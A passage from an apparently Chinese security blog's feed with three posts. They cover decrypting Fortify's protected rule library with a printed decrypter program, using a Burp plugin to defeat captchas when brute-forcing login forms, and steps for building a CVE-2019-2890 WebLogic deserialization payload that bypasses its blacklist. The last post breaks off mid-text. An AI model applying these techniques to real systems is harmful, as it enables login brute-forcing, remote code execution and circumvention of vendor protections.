    <content type="html"><![CDATA[<p>前段时间在学习fortify的规则编写，想充分利用其污点回溯功能来扫描出当下比较新的漏洞，比如fastjson反序列化漏洞。网上有比较好的资料是《fortify安全代码规则编写指南》，但是很缺例子。于是想参考下官方的规则库，但是是加密的，万般无奈只能踏上解密之旅。</p><h2 id="0x01-解密思路"><a href="#0x01-解密思路" class="headerlink" title="0x01 解密思路"></a>0x01 解密思路</h2><p>猜测fortify会和AWVS一样，会将规则库加载到内存当中进行解密，然后再使用其进行代码扫描。基于这个想法，它必然存在一个解密方法，而这个方法肯定在某个jar当中。锁定负责解密的jar之后，就可以审计jar的所有方法。然后通过调试来理清解密流程，最后我们就可以写代码来模拟这个过程，来解密规则库。</p><h2 id="0x02-定位解密jar"><a href="#0x02-定位解密jar" class="headerlink" title="0x02 定位解密jar"></a>0x02 定位解密jar</h2><p>通过反编译发现fortify依赖的jar基本都没有混淆，说明我们可以通过<code>jar名</code>和<code>类名</code>来初步锁定加密方法所在jar。类名搜索工具使用的是我在<a href="http://gv7.me/articles/2019/quickly-find-jars-that-depend-on-poc-exp/">《如何快速找到POC/EXP依赖的jar？》</a>一文中开发的<code>SearchClassInJar.jar</code>。在分别尝试<code>encrypt</code>,<code>decrypt</code>,<code>crypto</code>,<code>rule</code>,<code>fortify</code>等关键字后,最终搜索到两个可疑jar。</p><ol><li>fortify-common-17.10.0.0156.jar</li><li>fortify-crypto-1.0.jar</li></ol><p><img src="/articles/2019/fortify-rule-library-decryption-process/F42189E8-11C8-4825-A49B-58FD79640C35.png" alt="搜索解密jar"></p><h2 id="0x03-定位解密方法"><a href="#0x03-定位解密方法" class="headerlink" title="0x03 定位解密方法"></a>0x03 定位解密方法</h2><h4 id="3-1-通过调试定位"><a href="#3-1-通过调试定位" class="headerlink" title="3.1 通过调试定位"></a>3.1 通过调试定位</h4><p>定位解密方法最好的方法就是调试。打开fortify的<code>\Core\private-bin\awb\productlaunch.cmd</code>脚本，在最后一行如下图位置粘贴调试配置，就可以以调试模式启动fortify。然后配置IDEA连接5005端口即可进行调试。</p><p><img src="/articles/2019/fortify-rule-library-decryption-process/ECBDE745-99FE-40AC-8C13-D1267B9CA5BB.png" alt="让fortify开启调试模式"></p><p>通过审计这两个jar代码，基本确定<code>fortify-crypto-1.0.jar</code>就是加解密方法所在。通过函数名，参数类型，代码逻辑确定了如下涉及解密的可疑方法，并给它们都打上断点。</p><ol><li>void <code>decrypt</code>(long[] v, long[] k)</li><li>void <code>dec</code>(InputStream source, OutputStream dest, long[] usrKey)</li><li>InputStream <code>decryptCompressedAfterHeaders</code>(InputStream encrypted, String keyString)</li><li>InputStream <code>decryptAfterHeaders</code>(InputStream encrypted, String keyString, boolean compressed)</li><li>InputStream <code>decryptCompressed</code>(InputStream encrypted, String keyString)</li><li>void <code>encryptAfterHeaders</code>(InputStream stream, OutputStream ciphertext, String keyString, boolean compress)</li></ol><p>接着运行fortify扫描一个<code>java web demo</code>，最终漏洞是扫描出来了，但是没有一个可疑方法被调用，甚是奇怪。于是我将所有方法都打上断点，发现扫描期间只有<code>readHeaders(InputStream encrypted)</code>被调用了。</p><p><img src="/articles/2019/fortify-rule-library-decryption-process/8128736C-CBCB-4521-9E67-E33D900E0756.png" alt="扫描期间只有readHeaders方法被调用"></p><p>难道fortify并没有在扫描时对规则进行解密，可以直接读取规则内容？后面通过调用栈上下文也没发现解密操作。</p><h4 id="3-2-通过编码调用定位"><a href="#3-2-通过编码调用定位" class="headerlink" title="3.2 通过编码调用定位"></a>3.2 通过编码调用定位</h4><p>这时一个朋友突然叫去包饺子，我才记起今天是冬至。为了速战速决，我决定 通过写代码直接将规则库传入到可疑方法中进行解密，然后看返回的解密结果是否是有意义的明文来判断是否是我们要找的解密方法。 于是将CryptoUtil类中的所有代码审计一遍之后，发现decryptCompressed()可以解密压缩一个文件，感觉看到来希望。​</p><p>下面我们来看看该方法的运行流程。该方法最终会调用decryptAfterHeaders()，它负责控制解密解压整个流程。可以看到如果key没设置会被设置为默认值。接着会调用doBlockCipher()来解密，使用uncompressString来解压。</p><p><img src="/articles/2019/fortify-rule-library-decryption-process/0B404A33-CFBB-49CF-BE75-FB2364DEA968.png" alt="解密压缩方法decryptAfterHeaders()"></p><p>我们再来看看<code>doBlockCipher()</code>方法,它可以进行加密和解密。传入的是<code>false</code>所以是解密。</p><p><img src="/articles/2019/fortify-rule-library-decryption-process/DC72BDA4-2492-405B-AC9A-3815A386311A.png" alt="doBlockCipher()方法调用dec对文件进行解密"></p><p>而最终文件内容会被传入<code>dec()</code>方法解密。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">dec</span><span class="params">(InputStream source, OutputStream dest, <span class="keyword">long</span>[] usrKey)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">long</span>[] k = (<span class="keyword">long</span>[])((<span class="keyword">long</span>[])usrKey.clone());</span><br><span class="line">    <span class="keyword">byte</span>[] byteBuf = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">8</span>];</span><br><span class="line">    <span class="keyword">byte</span>[] byteBufDelay = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">long</span>[] unsigned32Buf = <span class="keyword">new</span> <span class="keyword">long</span>[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">long</span> top = <span class="number">4294967295L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> bytesRead;</span><br><span class="line">    <span class="keyword">while</span>((bytesRead = source.read(byteBuf)) != -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (bytesRead &lt; <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"invalid encrypted stream"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        byteArrayToUnsigned32(byteBuf, unsigned32Buf);</span><br><span class="line">        decrypt(unsigned32Buf, k);</span><br><span class="line">        k[<span class="number">0</span>] = k[<span class="number">0</span>] + <span class="number">17L</span> &amp; top;</span><br><span class="line">        k[<span class="number">1</span>] = k[<span class="number">1</span>] + <span class="number">17L</span> &amp; top;</span><br><span class="line">        k[<span class="number">2</span>] = k[<span class="number">2</span>] + <span class="number">17L</span> &amp; top;</span><br><span class="line">        k[<span class="number">3</span>] = k[<span class="number">3</span>] + <span class="number">17L</span> &amp; top;</span><br><span class="line">        unsigned32ToByteArray(unsigned32Buf, byteBuf);</span><br><span class="line">        <span class="keyword">if</span> (source.available() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> bytesToWrite = byteBuf[<span class="number">7</span>];</span><br><span class="line">            <span class="keyword">if</span> (bytesToWrite &gt; <span class="number">8</span> || bytesToWrite &lt; <span class="number">0</span> || byteBufDelay == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"invalid encrypted stream"</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            dest.write(byteBufDelay, <span class="number">0</span>, bytesToWrite);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (byteBufDelay != <span class="keyword">null</span>) &#123;</span><br><span class="line">            dest.write(byteBufDelay, <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">byte</span>[] t = byteBufDelay;</span><br><span class="line">            byteBufDelay = byteBuf;</span><br><span class="line">            byteBuf = t;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            byteBufDelay = byteBuf;</span><br><span class="line">            byteBuf = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">8</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此我们确定decryptCompressed()可以解密解压一个文件，至于是否可以是规则库文件，我们可以写如下代码来测试。</p><p><img src="/articles/2019/fortify-rule-library-decryption-process/117337DD-962F-4B64-90AF-AC4C98D92F47.png" alt="decryptCompressed()方法可以完美解密规则库文件"></p><p>发现解密结果是有意义的xml文件内容，完美解密！</p><h2 id="0x04-编写解密程序"><a href="#0x04-编写解密程序" class="headerlink" title="0x04 编写解密程序"></a>0x04 编写解密程序</h2><p>理清整个过程后，解密就很简单了。说白了就是批量调用fortify自带的<code>fortify-crypto-1.0.jar</code>中的<code>com.fortify.util.CryptoUtil.decryptCompressed()</code>方法进行解密。最后附上解密程序。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.fortify.util.CryptoUtil.decryptCompressed;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FortifyRuleDecrypter</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String ruleDir;</span><br><span class="line">    <span class="keyword">private</span> String saveDir;</span><br><span class="line"></span><br><span class="line">    FortifyRuleDecrypter(String ruleDir,String saveDir)&#123;</span><br><span class="line">        <span class="keyword">this</span>.ruleDir = ruleDir;</span><br><span class="line">        <span class="keyword">this</span>.saveDir = saveDir;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">doDecrypt</span><span class="params">()</span></span>&#123;</span><br><span class="line">        File encryptRule = <span class="keyword">new</span> File(ruleDir);</span><br><span class="line">        <span class="comment">// 传入的是文件</span></span><br><span class="line">        <span class="keyword">if</span>(encryptRule.isFile()) &#123;</span><br><span class="line">            <span class="keyword">if</span>(encryptRule.getName().endsWith(<span class="string">".bin"</span>)) &#123;</span><br><span class="line">                decryptRule(encryptRule, <span class="keyword">new</span> File(saveDir + File.separator + encryptRule.getName() + <span class="string">".xml"</span>));</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                System.out.println(<span class="string">"[-] The rule file suffix is.bin!"</span>);</span><br><span class="line">                System.exit(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//传入是目录</span></span><br><span class="line">        <span class="keyword">if</span> (encryptRule.isDirectory()) &#123;</span><br><span class="line">            File[] listFile = encryptRule.listFiles();</span><br><span class="line">            <span class="keyword">for</span>(File file:listFile)&#123;</span><br><span class="line">                <span class="keyword">if</span>(file.getName().endsWith(<span class="string">".bin"</span>))&#123;</span><br><span class="line">                    File saveName = <span class="keyword">new</span> File(saveDir + File.separator + file.getName().replace(<span class="string">".bin"</span>,<span class="string">""</span>) + <span class="string">".xml"</span>);</span><br><span class="line">                    decryptRule(file,saveName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">decryptRule</span><span class="params">(File encFile, File decFile)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//调用decryptCompressed()对规则库进行解密</span></span><br><span class="line">            InputStream ruleStream = decryptCompressed(<span class="keyword">new</span> FileInputStream(encFile), <span class="keyword">null</span>);</span><br><span class="line">            OutputStream outputStream = <span class="keyword">new</span> FileOutputStream(decFile);</span><br><span class="line">            <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">while</span> ((ruleStream.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                outputStream.write(b);</span><br><span class="line">            &#125;</span><br><span class="line">            ruleStream.close();</span><br><span class="line">            outputStream.close();</span><br><span class="line">            System.out.println(String.format(<span class="string">"[+] success %s -&gt; %s"</span>,encFile.getName(),decFile.getAbsolutePath()));</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            System.out.println(String.format(<span class="string">"[-] fail %s -&gt; %s"</span>,encFile.getName(),decFile.getAbsolutePath()));</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(args.length != <span class="number">2</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">"Usage: java -jar FortifyRuleDecrypter.jar [rule_dir|rule_file] &lt;save_dir&gt;"</span>);</span><br><span class="line">            System.exit(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        FortifyRuleDecrypter decrypter = <span class="keyword">new</span> FortifyRuleDecrypter(args[<span class="number">0</span>],args[<span class="number">1</span>]);</span><br><span class="line">        decrypter.doDecrypt();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/articles/2019/fortify-rule-library-decryption-process/726FEDA7-ABD4-4EED-9431-B87C034A5F5C.png" alt="解密效果"></p><h2 id="0x05-最后的话"><a href="#0x05-最后的话" class="headerlink" title="0x05 最后的话"></a>0x05 最后的话</h2><p>最终为了快速解决问题，通过编码调用锁定解密方法，确实有运气的成分。​最终虽然解决了问题，但依然存在如下疑问，只能等有空再研究。先赶时间去朋友那撸猫包饺子去了！</p><ol><li>fortify在扫描时没有调用解密方法，难道是加密的规则库可以直接用于扫描？</li><li>如果扫描无需解密规则库，那为何fortify又要在jar中提供解密方法？</li><li>到底解密方法在哪里被调用？</li></ol><p><img src="/articles/2019/fortify-rule-library-decryption-process/dumplings-and-cat.jpeg" alt="冬至的夜晚"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前段时间在学习fortify的规则编写，想充分利用其污点回溯功能来扫描出当下比较新的漏洞，比如fastjson反序列化漏洞。网上有比较好的资料是《fortify安全代码规则编写指南》，但是很缺例子。于是想参考下官方的规则库，但是是加密的，万般无奈只能踏上解密之旅。&lt;/p&gt;

      
    
    </summary>
    
      <category term="逆向破解" scheme="http://gv7.me/categories/%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3/"/>
    
    
      <category term="fortify" scheme="http://gv7.me/tags/fortify/"/>
    
  </entry>
  
  <entry>
    <title>使用burp插件captcha-killer识别图片验证码</title>
    <link href="http://gv7.me/articles/2019/burp-captcha-killer-usage/"/>
    <id>http://gv7.me/articles/2019/burp-captcha-killer-usage/</id>
    <published>2019-12-16T17:30:18.000Z</published>
    <updated>2019-12-16T18:37:31.053Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-开发背景"><a href="#0x01-开发背景" class="headerlink" title="0x01 开发背景"></a>0x01 开发背景</h2><p>说起对存在验证码的登录表单进行爆破，大部分人都会想到<code>PKav HTTP Fuzzer</code>，这款工具在前些年确实给我们带来了不少便利。反观burp一直没有一个高度自定义通杀大部分图片验证码的识别方案，于是抽了点闲暇的时间开发了<a href="https://github.com/c0ny1/captcha-killer" target="_blank" rel="noopener">captcha-kille</a>，希望burp也能用上各种好用的识别码技术。其设计理念是<code>只专注做好对各种验证码识别技术接口的调用！</code>说具体点就是burp通过同一个插件，就可以适配各种验证码识别接口，无需重复编写调用代码。今天不谈编码层面如何设计，感兴趣的可以去github看源码。此处只通过使用步骤来说明设计的细节。</p><h2 id="0x02-Step1-将获取验证码的数据包发送到插件"><a href="#0x02-Step1-将获取验证码的数据包发送到插件" class="headerlink" title="0x02 Step1:将获取验证码的数据包发送到插件"></a>0x02 Step1:将获取验证码的数据包发送到插件</h2><p>使用burp抓取获取验证码数据包，然后右键<code>captcha-killer</code> -&gt; <code>send to captcha panel</code>发送数据包到插件的验证码请求面板。</p><p><img src="/articles/2019/burp-captcha-killer-usage/step1-1.png" alt="将请求验证码数据包发送到插件"></p><p>然后到切换到插件面板，点击获取即可拿到要识别的验证码图片内容。</p><p><img src="/articles/2019/burp-captcha-killer-usage/step1-2.png" alt="请求获取验证码"></p><p><strong>注意：获取验证码的cookie一定要和intruder发送的cookie相同！</strong></p><h2 id="0x03-Step2-配置识别接口的地址和请求包"><a href="#0x03-Step2-配置识别接口的地址和请求包" class="headerlink" title="0x03 Step2:配置识别接口的地址和请求包"></a>0x03 Step2:配置识别接口的地址和请求包</h2><p>拿到验证码之后，就要设置接口来进行识别了。我们可以使用网上寻找免费的接口，用burp抓包，然后右键发送到插件的接口请求面板。</p><p><img src="/articles/2019/burp-captcha-killer-usage/step2-1.png" alt="将接口调用请求发送到插件"></p><p>然后我们把图片内容的位置用标签来代替。比如该例子使用的接口是post提交image参数，参数的值为图片二进制数据的base64编码后的url编码。那么<code>Request template</code>(请求模版)面板应该填写如下：</p><p><img src="/articles/2019/burp-captcha-killer-usage/step2-2.png" alt="接口请求模版设置"></p><table><thead><tr><th align="center">ID</th><th align="left">标签</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center">1</td><td align="left"><code>&lt;@IMG_RAW&gt;&lt;/@IMG_RAW&gt;</code></td><td align="left">代表验证码图片原二进制内容</td></tr><tr><td align="center">2</td><td align="left"><code>&lt;@URLENCODE&gt;&lt;/@URLENCODE&gt;</code></td><td align="left">对标签内的内容进行url编码</td></tr><tr><td align="center">3</td><td align="left"><code>&lt;@BASE64&gt;&lt;/@BASE64&gt;</code></td><td align="left">对标签内的内容进行base64编码</td></tr></tbody></table><p>最后点击“识别”即可获取到接口返回的数据包，同时在<code>request raw</code>可以看到调用接口最终发送的请求包。</p><p><img src="/articles/2019/burp-captcha-killer-usage/step2-3.png" alt="模版被渲染为最终的请求"></p><h2 id="0x03-Step3-设置用于匹配识别结果的规则"><a href="#0x03-Step3-设置用于匹配识别结果的规则" class="headerlink" title="0x03 Step3:设置用于匹配识别结果的规则"></a>0x03 Step3:设置用于匹配识别结果的规则</h2><p>通过上一步我们获取到了识别接口的返回结果，但是插件并不知道返回结果中，哪里是真正的识别结果。插件提供了4中方式进行匹配，可以根据具体情况选择合适的。</p><table><thead><tr><th align="center">ID</th><th align="left">规则类型</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center">1</td><td align="left">Repose data</td><td align="left">这种规则用于匹配接口返回包内容直接是识别结果</td></tr><tr><td align="center">2</td><td align="left">Regular expression</td><td align="left">正则表达式,适合比较复杂的匹配。比如接口返回包<code>{&quot;coede&quot;:1,&quot;result&quot;:&quot;abcd&quot;}</code>说明abcd是识别结果，我们可以编写规则为<code>result&quot;:&quot;(.*?)&quot;\}</code></td></tr><tr><td align="center">3</td><td align="left">Define the start and end positions</td><td align="left">定义开始和结束位置,使用上面的例子，可以编写规则<code>{&quot;start&quot;:21,&quot;end&quot;:25}</code></td></tr><tr><td align="center">4</td><td align="left">Defines the start and end strings</td><td align="left">定义开始和结束字符，使用上面的例子，可以编写规则为<code>{&quot;start&quot;:&quot;result\&quot;:\&quot;,&quot;end&quot;:&quot;\&quot;\}&quot;}</code></td></tr></tbody></table><p>通过分析我们知道，接口返回的json数据中，字段<code>words</code>的值为识别结果。我们这里使用<code>Regular expression</code>(正则表达式)来匹配，然后选择<code>yzep</code>右键<code>标记为识别结果</code>，系统会自动生成正则表达式规则<code>&quot; (.*?)&quot;\}\]</code>。</p><p><img src="/articles/2019/burp-captcha-killer-usage/step3-1.png" alt="设置匹配方式和自动生成规则"></p><p>注意：若右键标记自动生成的规则匹配不精确，可以人工进行微调。比如该例子中可以微调规则为<code>&quot;words&quot;\: &quot;(.*?)&quot;\}</code>将更加准确！</p><p>到达这步建议将配置好常用接口的url，数据包已经匹配规则保存为模版，方便下次直接通过右键<code>模板库</code>中快速设置。同时插件也有默认的模版供大家使用与修改。</p><p><img src="/articles/2019/burp-captcha-killer-usage/step3-2.png" alt="保存设置好的配置，方便下次快速配置"></p><h2 id="0x04-Step4-在Intruder模块调用"><a href="#0x04-Step4-在Intruder模块调用" class="headerlink" title="0x04 Step4:在Intruder模块调用"></a>0x04 Step4:在Intruder模块调用</h2><p>配置好各项后，可以点击<code>锁定</code>对当前配置进行锁定，防止被修改导致爆破失败！接着安装以下步骤进行配置</p><p><img src="/articles/2019/burp-captcha-killer-usage/step4-1.png" alt="设置Intruder的爆破模式和payload位置"></p><p><img src="/articles/2019/burp-captcha-killer-usage/step4-2.png" alt="验证码payload选择有插件来生成"></p><p><img src="/articles/2019/burp-captcha-killer-usage/step4-3.png" alt="进行爆破，可以通过对比识别结果看出识别率"></p><h2 id="0x05-使用小案例"><a href="#0x05-使用小案例" class="headerlink" title="0x05 使用小案例"></a>0x05 使用小案例</h2><p>后续将通过小案例来演示，如何通过captcha-killer让burp使用上各种技术识别验证码(免费方案)，敬请期待！</p><ul><li>《captcha-killer调用tesseract-ocr识别验证码》[待发布]</li><li>《captcha-killer调用完美识别验证码系统》[待发布]</li><li>《captcha-killer调用百度ocr识别验证码》[待发布]</li><li>《capatch-killer+机器学习识别验证码》[待发布]</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-开发背景&quot;&gt;&lt;a href=&quot;#0x01-开发背景&quot; class=&quot;headerlink&quot; title=&quot;0x01 开发背景&quot;&gt;&lt;/a&gt;0x01 开发背景&lt;/h2&gt;&lt;p&gt;说起对存在验证码的登录表单进行爆破，大部分人都会想到&lt;code&gt;PKav HTTP 
      
    
    </summary>
    
      <category term="安全开发" scheme="http://gv7.me/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="burp" scheme="http://gv7.me/tags/burp/"/>
    
  </entry>
  
  <entry>
    <title>Weblogic t3反序列化漏洞(CVE-2019-2890)分析</title>
    <link href="http://gv7.me/articles/2019/cve-2019-2890-vulnerability-analysis/"/>
    <id>http://gv7.me/articles/2019/cve-2019-2890-vulnerability-analysis/</id>
    <published>2019-11-04T14:04:07.000Z</published>
    <updated>2019-11-05T02:13:00.189Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-漏洞背景"><a href="#0x01-漏洞背景" class="headerlink" title="0x01 漏洞背景"></a>0x01 漏洞背景</h2><p>在WebLogic官方发布的10月份安全补丁中，包含了由Venustech ADLab提交的CVE-2019-2890的修复。该漏洞通过T3协议发送恶意的反序列化数据绕过了Weblogic的黑名单，成功反序列化执行任意命令。通过官方公告可知，该漏洞的利用条件是需要认证。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/965305D2-2F45-4575-9A16-18A076A01A08.png" alt="官方公告"></p><h2 id="0x02-影响范围"><a href="#0x02-影响范围" class="headerlink" title="0x02 影响范围"></a>0x02 影响范围</h2><ul><li>Weblogic 10.3.6.0.0</li><li>Weblogic 12.1.3.0.0</li><li>Weblogic 12.2.1.3.0</li></ul><h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h2><p>下面以10.3.6.0作为分析版本。问题出现在<code>PersistentContext</code>类上，通过查看继承关系我们知道<code>PersistentContext</code>类实现了序列化接口<code>Serializable</code>。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/E9257EC7-5283-4A10-B5A3-48768E40879D.png" alt="PersistentContext类继承关系"></p><p>我们来看看它的<code>readObject</code>方法，将<code>ObjectInputStream</code>类对象<code>var1</code>传入<code>readSubject</code>方法。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/E970A5E7-E834-400C-9984-5C3507948B64.png" alt="readObject方法"></p><p>跟进<code>readSubject</code>方法发现，会先从<code>var1</code>中读取反序列化数据当中的对象数据。然后调用<code>EncryptionUtil.decrypt</code>方法进行解密，最后解密后的数据被用于反序列化为对象。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/B61188D2-9A6F-4DAC-892B-C1144A88D230.png" alt="readSubject方法"></p><p>至此我们知道<code>PersistenContext</code>序列化数据中还携带了其他对象反序列化后的加密数据。如果我们在序列化<code>PersistentContext</code>时，将恶意对象反序列化数据先加密，然后<code>writeObject</code>，就可以让其携带恶意对象，绕过Weblogic黑名单进行反序列化了。</p><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><p>根据以上思路，我们编写一个携带恶意对象的<code>PersistenContext</code>类。只需修改下原来代码中的<code>writeSubject</code>方法为如下，其中<code>Poc.getObject()</code>就是我们的恶意对象。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/5FB1320C-A1C4-43F0-96C5-7D21EE70E199.png" alt="修改writeSubject方法代码"></p><p>在<strong>进行序列化之前我们要处理四个问题</strong>。<strong>第一个问题是创建PersistenContext对象报错</strong>。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/57A3655A-F776-49C2-BAA7-0F9F03198140.png" alt="创建PersistenContext对象报错信息"></p><p>这是因为<code>PersistenContext</code>初始化时调用了<code>SecurityServiceManager.isKernelIdentity()</code>进行内核身份判断。<code>isKernelIdentity</code>方法无论如何都会抛出一个<code>NotSupportedException</code>异常，导致我们序列化被终止。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/E816991E-9EA3-468E-85FA-1C9175314834.png" alt="SecurityServiceManager.isKernelIdentity()方法"></p><p>我们可以将其注释掉</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/3E6D0521-8AB3-45E2-B02D-803BBF515919.png" alt="PersistenContext构造方法要修改的代码"></p><p><strong>第二个问题是反序列化PersistenContext类会出现卡死现象</strong>。这是因为<code>PersistenContext</code>等相关的类都会有一个<code>AuthenticatedSubject</code>静态对象要初始化。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/A505C25E-EDF1-412B-8EDE-C7ABE8765F83.png" alt="静态AuthenticatedSubject内核id对象"></p><p>初始化时会进入到如下代码。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/F4F81B39-2D22-4F10-84C2-FF533AB55003.png" alt="导致卡死的代码段"></p><p>我们需要<code>ceClient</code>变量为<code>true</code>，否则会一直进循环执行<code>ceSubjectManagerLock.wait()</code>进行等待，无法序列化！而<code>ceClient</code>是从系统属性<code>com.bea.core.internal.client</code>获取的，所以在序列化之前需要将该属性设置为<code>true</code>。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/89C83A3D-8F6F-4C4E-890B-9090929D60F9.png" alt="ceClient变量的赋值"></p><p><strong>第三个问题是恶意对象没有被加密</strong>。这是因为在调用<code>EncryptionUtil.encrypt</code>方法加密时，会根据<code>Kernel.isServer()</code>为<code>true</code>时才会进行加密，否则返回原数据。<br>因此加密之前需要调用<code>KernelStatus.setIsServer(true)</code>设置状态为<code>true</code>。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/00CBD49C-24DD-45CB-8B96-5C96F59D2543.png" alt="加密时的判断"></p><p><strong>第四个问题，加密时需要<code>SerializedSystemIni.dat</code>文件。</strong> 我们需要目标服务器weblogic当前使用域下该文件放到我们poc的根目录。这也是官方将这个漏洞划分为需要认证的原因。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/0E16C9FC-DF1D-4162-8551-A99F81CDB316.png" 